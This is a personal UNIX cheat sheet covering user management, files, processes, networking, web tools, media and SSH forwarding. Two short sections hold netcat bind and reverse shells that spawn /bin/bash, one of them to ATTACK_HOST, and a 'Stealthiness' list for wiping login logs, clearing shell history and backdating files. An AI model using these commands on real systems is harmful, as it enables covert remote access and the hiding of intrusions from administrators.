-*- eval: (visual-line-mode 0) -*- #
# .always_forget.txt
#
# awdeorio's UNIX cheat sheet
#
# Andrew DeOrio <awdeorio@umich.edu>

# Users and Groups
adduser USER                            # add USER (Debian)
adduser --disabled-password --gecos ""  # ^^^ scriptable
adduser USER GROUP                      # add USER to GROUP (Debian)
adduser --system --no-create-home --uid 8000 blueflow  # add daemon user
groupadd --system --gid 8000 nogroup    # add daemon group
useradd USER                            # add USER, native binary
useradd -m -G users,wheel -s /bin/bash USER # add new USER manually
useradd --system                        # no homedir, no passwd, can't log in
deluser USER                            # remove a user
delgroup GROUP                          # remove a group
usermod -u UID USER                     # change UID
usermod -g GID USER                     # change default group
groupmod -g GID group                   # change GID of group
gpasswd -a USER GROUP                   # add USER to GROUP
usermod -aG GROUP USER                  # add USER to GROUP
smbpasswd -a USER                       # new Samba user
chsh -s /usr/local/bin/bash             # change default shell
chsh -s /usr/local/bin/bash USER        # change default shell for USER
id                                      # print user and group ID #'s
id -un                                  # print effective user name
id -gn                                  # print effective group name
getent passwd USER                      # check if user exists
getent group GROUP                      # check if group exists
ulimit -a                               # per-user system limits
groups                                  # list group membership
users                                   # list users logged in
w                                       # list users logged in
who                                     # list users logged in
finger USER                             # directory info about USER
whoami                                  # current user
logname                                 # current logged in user (e.g., w/ sudo)
passwd                                  # change your password
passwd USER                             # change USER's password
echo "USER:NEW_PASSWORD" | chpasswd     # change USER's password, batch
chage -E 2000-01-01 USER                # disable login with past expiration
usermod --expiredate 1 USER             # same thing
chage -E -1 USER                        # password never expires
passwd --lock                           # lock an account (SSH key access OK)
USER=$(stat -c '%U' PATH)               # check user in a script
GROUP=$(stat -c '%G' PATH)              # check group in a scrip

# Help
man CMD                                 # User manual for CMD
man -w                                  # Show search path for man pages
echo $MANPATH                           # Additional man search dirs
apropos                                 # Search commands and descriptions
whatis CMD                              # Short description of a command
tldr CMD                                # Short examples of a command

# Machines
hostname                                # name of this computer
uname                                   # operating system name
uname -a                                # info about OS, compiler, etc.
$OSTYPE                                 # operating system name (bash)
[[ "$OSTYPE" == "darwin"* ]]            # Check for macOS
cat /proc/cpuinfo                       # CPU size/features
cat /proc/meminfo                       # memory size/features
uptime                                  # time since power on
lspci                                   # list PCI devices
lspci -vv                               # ^^^ with lots of info

# Files and folders
ls                                      # list directory contents
ls -l                                   # include time, size, etc.
ls -a                                   # include hidden files
ls -A                                   # include hidden files, but not . or ..
ls -t                                   # sort by time
ls -ltr                                 # newest files last
ls -ltr --time-style=long-iso           # ^^^ time in YYYY-MM-DD HH:SS format
ls --color                              # colorize output
ls --color=auto                         # colorize output only in tty
ls --human-readable                     # human-readable file sizes
ls --ignore-backups                     # ignore *~ files
ls --ignore $'Icon\r'"                  # ignore OSX Icon files
ls --quoting-style=literal              # don't quote for 'File with spaces'
ls -R                                   # list recursively
tree                                    # list recursively in pretty format
tree -I 'env|__pycache__|*.egg-info'    # ignore Python bins
tree -I 'node_modules'                  # ignore JavaScript bins
tree -a -I .git                         # include hidden, exclude .git
tree -a -I '.git|env|__pycache__|*.egg-info|node_modules'  # Web projects
tree --gitignore                        # ignore files in .gitignore
tree --gitignore -a -I .git             # ignore files in .gitignore, w/ hidden
tree -l                                 # follow symlinks to directories
mkdir DIR                               # make a directory
mkdir -p DIR                            # ^^^ make intermediate dirs as needed
rmdir DIR                               # remove a directory
rm FILE                                 # remove a file
rm -r DIR                               # remove directory and files
rm -rf DIR                              # ^^^ and don't ask any questions
shred -u FILE                           # overwrite file with junk before remove
dircolors                               # set LS_COLORS using defaults
dircolors -b                            # ^^^ for Bourne shell
dircolors -b ${HOME}/.DIR_COLORS        # ^^^ with custom colors
stat FILE                               # file modification times, etc.
touch FILE                              # create empty file, if it doesn't exist
touch FILE                              # update mtime, atime to NOW
ln -s FILE1 FILE2                       # create soft link
ln -s -t DIR FILE                       # create soft link in DIR

# Paths and files
pwd                                     # current directory
pwd -P                                  # current directory, absolute path
readlink -f PATH                        # absolute path (GNU only)
cd                                      # change to home directory
cd ..                                   # change to directory up
cd DIR                                  # change to directory
cd -                                    # return to previous directory (bash)
cd $(dirname "$BASH_SOURCE") && pwd -P  # absolute path of sourced bash script
cd $(dirname "$0") && pwd -P            # absolute path of executed bash script
realpath DIR                            # absolute path of DIR
pushd DIR                               # push DIR onto stack (bash)
popd                                    # pop dir off stack and cd there (bash)
dirs -v                                 # print stack (bash)
cd ~2                                   # cd to 2nd dir on stack (bash)
cp FILE ~2                              # use ~2 as an alias for a DIR (bash)
cp -L                                   # Copy files pointed to by symlinks

# Paths and executables
which CMD                               # print path to CMD
which -a CMD                            # print all paths to CMD (GNU)
whereis CMD                             # print all paths to CMD
export PATH=$PATH:NEW_DIR               # add new directory to PATH (bash)
type -a CMD                             # include shell functions/aliases (bash)

# Finding files
find . -name hello.txt                  # find hello.txt, starting at PWD
find / -name hello.txt                  # find hello.txt, starting at /
find '*.txt'                            # txt files
find '*hello*'                          # anything with "hello" in the filename
find -type f                            # plain files
find -type d                            # directories
find -name '*~' -exec rm -v {} \;       # remove tilde files
find -name '*~' | xargs rm -v           # remove tilde files
find -name GLOB -depth -delete          # remove files
find -exec grep -H PATTERN {} \;        # find + grep, grep will print filenames
find | xargs grep -H PATTERN            # find + grep, grep will print filenames
find -print0 | xargs -0 CMD             # handle spaces in filenames
find | xargs -n1 CMD                    # process files one at a time
find -mtime 3 -type f                   # files modified exactly 3 days ago
find -mtime -3 -type f                  # files modified less than 3 days ago
find -mtime +3 -type f                  # files modified more than 3 days ago
find . -not -path '*/\.git*'            # ignore .git dir
find . -type f -not -wholename '*\.git*' -exec file {} \; | grep CRLF  # Windows line endings
locate FILE                             # search system database for hello.txt
mdfind FILE                             # ^^^ Some macOS systems
grep -r PATTERN .                       # recursively search file content
grep -rI PATTERN .                      # ^^^ ignoring binary files
git grep PATTERN                        # recursively search git-controled files
ag PATTERN                              # The Silver Searcher, see section below
ag PATTERN --color | less -r
ag -l                                   # Filenames only
ag --ignore '*test*'                    # Ignore files/directories with "test"
ag -f                                   # Follow symlinks
ag -Q                                   # Do not parse PATTERN as regex
ag --hidden master --ignore .git

# Superuser permissions
su                                      # switch user to root
su USER                                 # switch user to USER
sudo -s                                 # switch user to root
sudo CMD                                # run CMD as root
sudo CMD                                # run CMD as root
sudo -u USER CMD                        # run CMD as USER
sudoedit FILE                           # edit file as root
visudo                                  # edit /etc/sudoeors config file
sudo -k                                 # empty cache that stores your password
sudo -E                                 # preserve environment variables
sudo "PATH=$PATH" -E                    # ^^^ including PATH
sudo -v                                 # cache sudo credentials, for scripts
newgrp GROUP                            # change default group temporarily

# Processes and Threads
ps                                      # display my processes
ps -u USER                              # ^^^ USER's processes
ps -ax                                  # all processes on the machine
ps -axM                                 # all processes and threads (BSD)
ps axm                                  # all processes and threads (GNU)
ps -M                                   # threads (BSD)
ps -m                                   # threads (GNU)
ps -ww                                  # don't chop long lines
ps -c                                   # basename of executable instead of full
ps -axvcm                               # sort by memory usage
ps -axvcr                               # sort by CPU usage
pstree                                  # visualization of processes
top                                     # dynamic view of processes
top -H                                  # dynamic view of threads
top -b -n7 -d0.5 | grep ^Cpu | sed 1d | grep -oE '[0-9]+\.?[0-9]*% *id' | grep -oE '[0-9]+\.?[0-9]*' | awk '{sum+=$0} END {print sum/NR}' # CPU usage (%)
htop                                    # fancy performance monitor
  "M"                                   # htop sort by memory usage
  "P"                                   # htop sort by processor usage
  "T"                                   # htop sort by time
  "p"                                   # htop toggle process fullname/basename
  "t"                                   # htop toggle tree view
nmon                                    # fancy performance monitor
pgrep STRING                            # search for processes, return PID
pgrep -af STRING                        # ^^^ full process name & args (GNU)
pgrep -lf STRING                        # ^^^ full process name & args (BSD)
pgrep -u USER                           # only match USER's processes
pkill                                   # ^^^ and kill process
pkill -f                                # ^^^ full process name & args
kill PID                                # kill process with PID
kill -PID                               # kill process group with PID
kill -9 PID                             # kill process using signal 9
kill -0 PID                             # Check if process is running
kill -0 PID &>/dev/null && echo running # Check if process is running
killall NAME                            # kill all processes with NAME
killall -9 NAME                         # kill all using signal 9
CMD &                                   # start CMD in the background
jobs                                    # list active or suspended jobs
fg                                      # bring background command to foreground
[control-z]                             # suspend current CMD
bg                                      # send suspended CMD to background
disown                                  # alternative to "bg", but like nohup
nohup CMD &                             # logout won't stop CMD
nohup nice CMD &                        # lower priority
nohup CMD < /dev/null > LOG 2>&1        # redirect all streams
nohup CMD 0<&- &> /dev/null &           # redirect all streams
lsof                                    # list open files owned by processes
cat /proc/<PID>/environ | tr '\000' '\n'# inspect environment of running proc

# Commonly used signals
1  HUP  SIGHUP   hang up; automatic on logout; reload configuration for daemons
2  INT  SIGINT   interrupt, Control-C
3  QUIT SIGQUIT  quit
6  ABRT SIGABRT  abort
9  KILL SIGKILL  non-catchable, non-ignorable kill; "rude shutdown"
14 ALRM SIGALRM  alarm clock
15 TERM SIGTERM  software termination signal; "polite shutdown request"
   EXIT          program exit, any exit code (pseudo-signal, bash only)
   ERR           program exit, non-zero (pseudo-signal, bash only)

# Environment
printenv                                # List environment variables
env                                     # List environment variables
set                                     # List env vars, local vars, functions
echo $VARIABLE                          # Print one environment variable
printenv VARIABLE                       # Print one environment variable
env -i CMD                              # Run CMD with empty environment
env --unset VARIABLE                    # unset VARIABLE
unset VARIABLE                          # unset VARIABLE (Bash built-in)
$PATH                                   # Command search path
$PS1                                    # Shell prompt
$LD_LIBRARY_PATH                        # Run time library resolution
$MANPATH                                # man search dirs

# Manual network configuration (DHCP)
killall dhcpcd
ifconfig eth1 down
ifconfig eth1 hw ether '00:16:cb:05:3b:10'  # spoof MAC addr
iwconfig eth1 key PASSWORD
iwconfig eth1 essid SSID
ifconfig eth1 up
dhcpcd -t 10 -N eth1

# Manual network configuration (static IP)
# NOTE: many of these commands are replaced by the "ip" program's subcommands
nmap -sn '141.212.106.*'  # see what IP addresses are in use
dig -x 141.212.106.7      # verify that my IP is not in DHCP space
ifconfig eth0 down
ifconfig eth0 141.212.106.7 broadcast 141.212.106.255 netmask 0xffffff80 up
route flush     # remove all routes
route add default gw 141.212.106.1
edit /etc/resolv.conf
  > search eecs.umich.edu
  > nameserver 141.213.4.4
  > nameserver 141.213.4.5
  > nameserver 141.213.13.31

# Network Utilities
# Cheat sheet https://pbs.twimg.com/media/DzP-KfpV4AA4TH2.jpg
ping HOST                               # Check if a host is up
ping -c3 HOST                           # Only send 3 packets
ping -Iwlan0 HOST                       # Ping with a specific NIC
host HOST                               # DNS lookup
dig HOST                                # DNS lookup
dig +short HOST                         # DNS lookup, scriptable
dig +trace HOST                         # DNS lookup with full tree
dig +trace +all HOST                    # DNS lookup with full tree, max detail
nslookup                                # DNS lookup
nslookup -type=ns HOST                  # DNS with authoritative name servers
dig -x IP                               # reverse DNS lookup
dig +short -x IP                        # reverse DNS lookup, scriptable
cat /etc/resolv.conf                    # what are my DNS servers?
whois HOST                              # domain name registration info
nmap HOST                               # what ports are open?
nmap -A -T4 HOST                        # what ports are open?
nmap -sn -PR 192.168.0.0/24             # which hosts are up my subnet?
nmap -p80 192.168.1.0/24                # Hosts with port 80 open
nmap -p80 192.168.1.0/24 -oG - | grep open # Hosts with port 80 open, grepable
netstat -at                             # list TCP connections
netstat -au                             # list UDP connections
netstat -ant                            # disable DNS lookup (faster)
netstat -tl                             # listening TCP connections
netstat -atn | grep ':22'               # ssh connections on this machine?
netstat -l numeric-ports | grep 80      # what's using port 80?
sudo fuser -v -n tcp 80                 # who's using port 80?
lsof -n -i :80                          # who's using port 80?
lsof -nP -iTCP:4000 -sTCP:LISTEN        # who's listening on port 4000?
nc HOST PORT                            # intiate connection "cat over a socket"
nc -c                                   # close connection after send (GNU)
nc -q                                   # close connection after send (BSD)
nc                                      # close connection after send (BSD)
nc -l -p PORT                           # listen for incoming connection (GNU)
nc -l localhost PORT                    # listen for incoming connection (BSD)
nc -v -z HOST PORT                      # check connection to HOST on PORT
ncat -w 2 -v HOST PORT                  # check connection to HOST on PORT
traceroute                              # route packets take to network host
curl https://freegeoip.app/json/        # IP geolocation
curl 'https://api.ipgeolocation.io/ipgeo?apiKey=API_KEY'  # ^^^ API_KEY from dashboard https://app.ipgeolocation.io/
open https://github.com/stefansundin/traceroute-mapper  # ^^^ visualization
[sudo] mtr HOST                         # dynamically updated traceroute info
mtr --no-dns --report --report-cycles 60# one report generated over 60s
telnet HOST 80                          # connect to web server
openssl s_client -quiet -connect www.google.com:443 # ^^^ with SSL
tcpdump                                 # watch packets on all network ifcs
tcpdump -i eth0                         # watch packets on one network interface
tcpdump tcp                             # only one protocol
tcpdump port 80                         # only one port
tcpdump host 1.2.3.4                    # only one host
tcpdump dst 1.2.3.4                     # only one dest
tcpdump src 1.2.3.4                     # only one source
tcpdump -S "tcp[tcpflags] & (tcp-syn|tcp-ack|tcp-fin) != 0" # 3-way handshake
tcpdump -S "port 80 and (tcp[tcpflags] & (tcp-syn|tcp-ack|tcp-fin) != 0)" #  3-way handshake on port 80
tcpdump -S "host web.eecs.umich.edu and port 80 and (tcp[tcpflags] & (tcp-syn|tcp-ack|tcp-fin) != 0)"   # 3-way handshake on port 80
tcpdump -S -s0 -A port 80               # Sniff HTTP packets in ASCII format
tcpdump -w FILE.pcap                    # Save raw packet data to FILE
tcpdump -r FILE.pcap                    # Read and parse packet data from FILE
tshark                                  # CLI packet analysis
tshark -r FILE.pcap                     # ^^^ from file
tshark -Tfields -e text                 # ^^^ any sent text
tshark -Tfields -e http.file_data       # ^^^ HTTP payload
tshark -Tfields -e _ws.col.Protocol -e _ws.col.Info  # Manually specify defaults
tshark -Tfields -e _ws.col.Protocol -e _ws.col.Info -e http.file_data  # HTTP, defaults
tshark -O http -Y "http.request || http.response"  # HTTP with headers
iftop                                   # display bandwidth usage
ngrep                                   # grep for network
sudo ngrep -d any google                # see traffic to/from Google
mitmproxy                               # spy on SSL connections
p0f                                     # OS fingerprinting
ntop                                    # See what's using network bandwidth
iftop                                   # See what's using network bandwidth
siege                                   # Load testing tool

# Example: observing an HTTP request
echo '<html><body>Hello world!</body></html>' > index.html   # Simple HTML
python3 -m http.server                                       # Start server
sudo tcpdump -i lo0 port 8000 -w get.pcap                    # Start tcpdump
curl -v 127.0.0.1:8000/index.html                            # Request
tshark -r get.pcap -Tfields -e _ws.col.Protocol -e _ws.col.Info -e http.file_data  # Read pcap

# Web Utilities
python -m SimpleHTTPServer 8000         # start a file server at ./ on port 8000
python3 -m http.server 8000             # start a file server at ./ on port 8000
wget https://www.google.com/            # download one page
wget -m andrewdeorio.com                # download everything
wget URL -O FILE                        # output to FILE
wget --random-wait                      # avoid a blacklist with random timing
wget -r                                 # recursive (default max depth 5)
wget -p                                 # include all files, including images
wget -e robots=off                      # disregard robots.tx
wget -U mozilla/5.0                     # User-agent (browser identity)
wget --limit-rate=20k                   # reduce download rate
wget -b                                 # background
wget -o FILE                            # log output
wget --random-wait -r -p -e robots=off -U mozilla/5.0 URL  # crawler
wget --random-wait -r -p -e robots=off -U mozilla/5.0 URL -b -o log  # crawler
wget --spider                           # check if file exists
wget --timestamping                     # check if file has changed
youtube-dl URL                          # download a youtube video
curl                                    # download a single web page
curl -v                                 # include headers
curl -L                                 # follow redirects
curl -k                                 # insecure mode, ignore SSL certs
curl -I                                 # headers only
curl --verbose                          # watch protocol in action
curl --trace-ascii log.txt              # watch protocol in action, more detail
curl --trace-ascii log.txt --trace-time # include timing
curl --data "query=aa" http://localhost:5000/query # send POST request
curl -H "Content-type: application/json" \         # POST JSON
     -X POST http://127.0.0.1:5000/ \
     -d '{"message":"Hello Data"}'
curl --user-agent "Mozilla/5.0"         # Fake the user agent
curl ifconfig.me                        # what is my IP address?
curl ipinfo.io/ip                       # what is my IP address?
curl https://freegeoip.app/json/IP      # geolocation data for IP address
ipcalc                                  # see what an IP or CIDR means
httping HOST:PORT                       # check if an HTTP server is up
curl --output /dev/null --silent --insecure --head --fail URL # check HTTP up
dig +short myip.opendns.com @resolver1.opendns.com # what is my IP address?
vnu --root DIR                          # HTML5/W3C validator
html5validator --root DIR               # HTML5/W3C validator
linkchecker index.html                  # Verify internal links
linkchecker index.html --check-extern   # Verify internal and external links
webkit2png https://google.com           # Screenshot web page
webkit2png google.htm                   # Screenshot saved web page
ls *.html | xargs -n1 webkit2png        # Screenshot many saved web pages
speedtest                               # Test upload and download speeds

# Echo server
http POST httpbin.org/anything x=y      # Public echo server test
echo -e "HTTP/1.1 200 OK\n\n{}\n" | nc -l -p 8000  # Local CLI echo server
npm install --global http-echo-server   # http-echo-server install
http-echo-server                        # http-echo-server run
http POST localhost:56406 key=value     # http-echo-server test

# Curl: test website loading speed / latency
curl \
  https://www.google.com \
  --silent \
  -o /dev/null \
  --write-out \
'%{url_effective}
Lookup:\t\t%{time_namelookup}
Connect:\t%{time_connect}
App Connect:\t%{time_appconnect}
Redirect:\t%{time_redirect}
Pre-transfer:\t%{time_pretransfer}
Start-transfer:\t%{time_starttransfer}
------------------------
Total Time:\t%{time_total}
'

# Curl: log in with cookies
curl \
  --request POST \
  --cookie-jar cookies.txt \
  --form 'username=awdeorio' \
  --form 'password=password' \
  --form 'submit=login' \
  ${BASE_URL}/accounts/login/
curl \
  --cookie cookies.txt \
  ${BASE_URL}/api/

# Wget: log in with cookies
wget \
  --post-data 'username=awdeorio&password=password&submit=login' \
  --save-cookies cookies.txt \
  --keep-session-cookies \
  ${BASE_URL}/accounts/login/
wget \
  --load-cookies cookies.txt \
  ${BASE_URL}/api/

# HTTPie
http HOST                               # GET request to HOST
http POST URL K1=V1 K2=V2 ...           # POST JSON with key/value pair(s)
http POST URL K1:='{"K2":"V2"}'         # POST escaped nested JSON value
http POST URL K1=V1 K2=V2 --form ...    # POST HTTP form
http -a USERNAME:PASSWORD               # Authenticate with basic HTTP auth
http --verify=no                        # Do not check SSL certificate

# HTTPie and session cookies
# 1. Log in using an HTML form, saving cookies to file session.json
# 2. Reuse HTTPie file session.json
http --session=./session.json --form POST URL username=X password=Y
http --session=./session.json URL

# Jekyll static web sites
jekyll doctor                           # Verify config files
jekyll build                            # Build site to _site/
jekyll serve                            # Start live dev server
bundle exec jekyll                      # Locally installed Jekyll

# Primer Spec Preview
gem install bundler
bundle install
bundle update --all                     # Update lock file
bundle exec jekyll serve

# Backdoor shell using netcat
# Note: this version of netcat (ncat) ships with nmap
TARGET_HOST $ ncat -lvp 8080 -e /bin/bash --ssl
ATTACK_HOST $ ncat TARGET_HOST 8080 --ssl

# Backdoor reverse shell using netcat
# This works when the firewall prevents incoming connections
# Note: this version of netcat (ncat) ships with nmap
ATTACK_HOST $ ncat -l -p 8080 -vv --ssl
TARGET_HOST $ ncat -e /bin/bash ATTACK_HOST 8080 --ssl

# Stealthiness
last                                    # successful login history
lastb                                   # bad login attempts
lastlog                                 # most recent login
echo > /var/log/wtmp                    # clear successful login history
echo > /var/log/btmp                    # clear bad login history
echo > /var/log/lastlog                 # clear recent login history
unset HISTFILE                          # don't write history for this session
history -c                              # clear shell history
edit ~/.history ~/.bash_history         # edit history
touch -d "2 hours ago" FILE             # change atime, mtime w/ relative time
touch -d "2016-01-01"                   # ^^^ date
touch -d "2016-01-01 12:34:56"          # ^^^ date and time
touch -d "2015-01-01 12:34:56 +0400"    # ^^^ date, time, w/ time zone
touch -r REF_FILE FILE                  # match attributes of FILE to REF_FILE
edit /var/log/{messages,syslog}         # remove info about changed time

# Tor from the command line
#
# configuration (optional)
$EDITOR /usr/local/etc/tor/torrc
#
# Start Tor proxy
$ tor
...
Dec 13 09:23:17.000 [notice] Bootstrapped 100%: Done
#
# Tor opens a SOCKS proxy on localhost:9050 by default.  Check open port.
$ nc -v -z localhost 9050
localhost [127.0.0.1] 9050 open
#
# What is my IP?  (with Tor)
$ curl --socks5 localhost:9050 ipinfo.io/ip
62.210.81.152
#
# What is my IP?  (with Tor)  This one won't work on OSX
$ torsocks curl ipinfo.io/ip
62.210.81.152
#
# What is my IP? (without Tor)
$ curl ipinfo.io/ip
141.212.107.235

# Firewall / iptables
iptables -L                             # List current rules
iptables -A INPUT -p tcp --dport ssh -j ACCEPT  # Accept SSH traffic
iptables -A INPUT -p tcp --dport 80 -j ACCEPT   # Accept web traffic
sudo iptables -A INPUT -j DROP          # Block all other traffice
iptables -F                             # Flush all rules
iptables -P INPUT ACCEPT                # 1. Temporarily disable firewall
iptables -P OUTPUT ACCEPT               # 2. Temporarily disable firewall
iptables -P FORWARD ACCEPT              # 3. Temporarily disable firewall
iptables -F                             # 4. Temporarily disable firewall

# Shell communication
wall                                    # send message to all terminals
write USER                              # send message to USER

# Email
sendmail user@example.com < email.txt   # send email from CLI
sendmail -t < email.txt                 # read "TO" field from file
mailmerge                               # mailmerge from CLI
mailmerge <<< $MAILPASS                 # automate password entry

# Email / Test SMTP server
# https://github.com/jetmore/swaks/blob/master/doc/base.pod
swaks --to user@example.com --server test-server.example.net

# Audio
alsamixer                               # change volume
amixer -c 0 sset Master '6%+'           # change volume
amixer -c 0 sset Headphone toggle       # toggle speakers/headphones
mplayer "$(ls | shuf -n1)"              # select and play a random file

# Video

# Read video device live
mplayer tv://
mplayer tv:// -tv driver=v4l2:width=352:height=288:device=/dev/video0 -fps 20
vlc v4l2:///dev/video0

# Record video
mencoder tv:// -tv driver=v4l2:width=352:height=288:device=/dev/video0:forceaudio:adevice=/dev/dsp -fps 20 -ovc lavc -oac mp3lame -lameopts cbr:br=64:mode=3 -o file.avi

# Record video without audio
mencoder tv:// -tv driver=v4l2:width=352:height=288:device=/dev/video0 -fps 20 -nosound -ovc lavc -o file.avi

# Convert mov to mp4
ffmpeg -i source.mov target.mp4

# Convert VOB to mp4
# http://stackoverflow.com/questions/13560852/convert-mp4-to-maximum-mobile-supported-mp4-using-ffmpeg
ffmpeg -i concat:"/media/dvd/VIDEO_TS/VTS_01_1.VOB | /media/dvd/VIDEO_TS/VTS_01_2.VOB" -acodec libfaac -aq 100 -ac 2 -vcodec libx264 -vpre slow -crf 24 -threads 0 output.mp4

# Compress mp4 video to 480p at 500kbit/s mp4
ffmpeg -i input.mp4 -vcodec libx264 -vprofile high -preset slow -b:v 500k -maxrate 500k -bufsize 1000k -vf scale=-1:480 -threads 0 -b:a 128k output_file_480p.mp4

# Compress mp4 video to 360p at 250kbit/s mp4
ffmpeg -i input.mp4 -vcodec libx264 -vprofile baseline -preset slow -b:v 250k -maxrate 250k -bufsize 500k -vf scale=-1:360 -threads 0 -ab 96k output_360p.mp4

# Stream live video
cvlc v4l2:///dev/video0 :v4l2-standard= :input-slave=alsa://hw:0,0 :live-caching=300 :sout="#transcode{vcodec=WMV2,vb=800,scale=1,acodec=wma2,ab=128,channels=2,samplerate=44100}:http{dst=:8080/stream.wmv}"

# Stream live video without audio
cvlc v4l2:///dev/video0 :v4l2-standard= :live-caching=300 :sout="#transcode{vcodec=WMV2,vb=800,scale=1,select=noaudio}:http{dst=:8080/stream.wmv}"

# Stream live video without audio, and lower frames-per-second (10)
cvlc v4l2:///dev/video0 :v4l2-standard= :live-caching=300 :sout="#transcode{vcodec=WMV2,vb=800,scale=1,fps=10,select=noaudio}:http{dst=:8080/stream.wmv}"

# View live video stream
vlc http://HOST:8080/stream.wmv
mplayer http://HOST:8080/stream.wmv

# Create GIF from video
# ffmpeg -r N means reduce to N fps
# gifsicle --delay=N means delay N*10 ms between frames
ffmpeg -i "$INFILE" -pix_fmt rgb8 -r 10 -f gif - | gifsicle --delay=10 --optimize=3 > "$OUTFILE"

# Images
mogrify -rotate 90                     # rotate
mogrify -resize 640x640                # reduce resolution
convert FILE.png FILE.jpg              # convert image file type
convert IN.jpg -monochrome OUT.jpg     # convert image to black and white
mogrify -quality 85%                   # reduce file size
mogrify -define jpeg:extent=100KB      # reduce file size to max 100KB
mogrify -strip -define jpeg:extent=100KB  # Web images
imageoptim FILE.jpg                    # reduce file size
imageoptim '*.jpg'                     # reduce file size
exiftool                               # read all exif data
exiftool '-AllDates+=3:02:00 00:00:00' # date/time += 3 yr 2 mos
exiftool -gpslatitude -gpslongitude    # GPS coordinates
identify FILE.jpg                      # dump size and other data
identify -format "%w×%h"               # dump length, height https://imagemagick.org/script/escape.php
identify -verbose FILE.jpg             # dump EXIF data
mogrify -strip                         # remove EXIF data

# SSH
ssh HOST                               # connect to HOST
ssh USER@HOST                          # connect to HOST as USER
ssh -t HOST1 HOST2                     # connect to HOST2 through HOST1
ssh -A                                 # forward SSH keys
ssh -vT                                # debug authentication issues
ssh -T                                 # don't set up a terminal
ssh -v                                 # verbose
ssh -vvv                               # super verbose
ssh -f                                 # go to background
ssh -N                                 # don't execute a remote command
ssh -n                                 # redirect stdin from /dev/null
ssh -vnNTL 8000:localhost:8000 HOST    # local port forwarding, 1 hop
ssh -vnNTL 8000:HOST2:8000 HOST1       # local port forwarding, 2 hop
ssh -vnNTR 8000:localhost:8000 HOST    # remote port forwarding
ssh -D8000 HOST                        # dynamic application-level port forward
ssh HOST CMD                           # execute CMD on HOST
ssh HOST -- CMD                        # execute CMD on HOST, with CMD options
yes | pv | ssh HOST "cat > /dev/null"  # network throughput test

# SSH keys
ssh-keygen -t ed25519 -C EMAIL         # generate SSH keys, BEST
ssh-keygen -t rsa -b 4096 -C EMAIL     # generate SSH keys, legacy
ssh-keygen -R HOST                     # remove HOST from known_hosts
ssh-add -L                             # print public key from agent

# SSH install public key on host
ssh-copy-id HOST
cat ~/.ssh/id_rsa.pub | ssh HOST "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
gpg --export-ssh-key awdeorio | ssh HOST "cat >> ~/.ssh/authorized_keys"

# SSH agent save SSH key passphrases
# https://docs.github.com/en/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent#adding-your-ssh-key-to-the-ssh-agent
pkill ssh-agent                        # stop SSH agent
eval "$(ssh-agent)"                    # start SSH agent
pgrep ssh-agent                        # status SSH agent (expect one PID)
echo $SSH_AGENT_PID                    # print SSH agent env vars
echo $SSH_AUTH_SOCK                    # print SSH agent env vars
ssh-add -L                             # print public key from agent
ssh -vT HOST                           # test connection

# SSH debug
ssh -vT git@github.com                 # Test connection
chmod go-w ~/                          # Fix SSH key permissions
chmod 700 ~/.ssh                       # Fix SSH key permissions
chmod 644 ~/.ssh/authorized_keys       # Fix SSH key permissions
ssh-add -L                             # print public key from agent

# SSH agent forwarding (github example)
# https://developer.github.com/guides/using-ssh-agent-forwarding/
local > ssh -T git@github.com           # check github connection
local > echo $SSH_AUTH_SOCK             # check ssh-agent is running
local > ssh-add -L                      # check key is added
local > ssh-add ~/.ssh/id_dsa           # add my key, temporary
local > ssh-add -K ~/.ssh/id_dsa        # add my key, permanent, OSX
local > ssh -A SERVER                   # ssh to server, forwarding key
remote> server $ ssh -T git@github.com  # check github connection
server $ echo $SSH_AUTH_SOCK            # check ssh-agent is running
server $ git remote -v                  # check repo is cloned with SSH URL
server $ sudo -E                        # preserve environment when using sudo

# SSH Port Forwarding Explained
# https://vimeo.com/54505525#t=1029s
#
# Local port forwarding allows connections to be made from the local network,
# through the SSH server, and to a remote host
#  - SSH client -> SSH server -> remote host
#  - e.g. connect to a staging environment SQL database
#  - e.g. connect to a VNC server
#  - e.g. bypass firewall for any server (as long as you have SSH)

# Local port forward localhost:8080 -> REMOTEHOST:80
ssh -vnNTL 8080:localhost:80 REMOTEHOST
curl https://localhost:8080
  +---------------+          +--------------+
  |   localhost   |---SSH---\|  REMOTEHOST  |
  |     :8080 ===================> :80      |
  |               |---------/|              |
  +---------------+          +--------------+
# EXAMPLE: connect to Jupyter Notebook behind a firewall (local port forwarding)
remotehost> jupyter-notebook
localhost > ssh -vnNTL 8888:localhost:8888 $REMOTEHOST
localhost > # browse to http://localhost:8888

# Local port forward localhost:8080 -> REMOTEHOST:80, through PUBLICHOST
# ssh -L ${localhost:LPORT}:${REMOTEHOST:RPORT} PUBLICHOST
ssh -vnNTL 8080:REMOTEHOST:80 PUBLICHOST
curl https://localhost:8080
                                 +-------------------------------------- +
  +---------------+          +--------------+        +---------------+   |
  |   localhost   |---SSH---\|  PUBLICHOST  |        |  REMOTEHOST   |   |
  |     :8080 ==============================|=============> :80      |   |
  |               |---------/|              |        |               |   |
  +---------------+          +--------------+        +---------------+   |
                                 |              private network          |
                                 +---------------------------------------+
# EXAMPLE: connect to database and bypass firewall (local port forwarding)
ssh -vnNTL 1521:crow.dsc.umich.edu:1521 login.itd.umich.edu
nc -v -z localhost 1521 2>&1
sqlplus -S $USER/$PASSWORD@localhost:1521/pa07.world

# Remote port forwarding allows connections to be made from a remote network,
# through the SSH server, and to the local network
#  - remote host -> SSH server -> SSH client
#  - e.g. Share your locally deployed app with someone on the internet
#  - e.g. Remotely pair with people over SSH + Tmux
#  - e.g. SCP a file from your laptop to a server -- FROM the server (no need
#    to create a new tab and PUSH the file, just PULL it)

# Remote port forward REMOTEHOST:8080 -> localhost:8000
ssh -vnNTR 8000:localhost:8080 $REMOTEHOST
  +---------------+          +--------------+
  |       me      |---SSH---\|  REMOTEHOST  |
  |     :8000 <===================:8080     |
  |               |---------/|              |
  +---------------+          +--------------+
# EXAMPLE: push a file to your laptop *from* a server (remote port forwarding)
# This can be helpful if you need to find the file before scp'ing it
laptop> ssh -A -R 2222:localhost:22 SERVER   # login to server
server> scp -P2222 FILE localhost:           # copy FILE from server to laptop
#
# EXAMPLE: start remote VNC session
server> vncserver -localhost -NeverShared
laptop> ssh -vnNTL 5901:localhost:5901 $SERVER
laptop> vncviewer localhost:1           # start VNC client
server> $EDITOR ~/.vnc/.vnc/xstartup    # change xsession to gnome, etc.
server> vncserver -kill :1              # stop VNC server

# Remote port forward PUBLICHOST:8080 -> localhost:8000
ssh -vnNTR 8000:localhost:8080 $PUBLICHOST
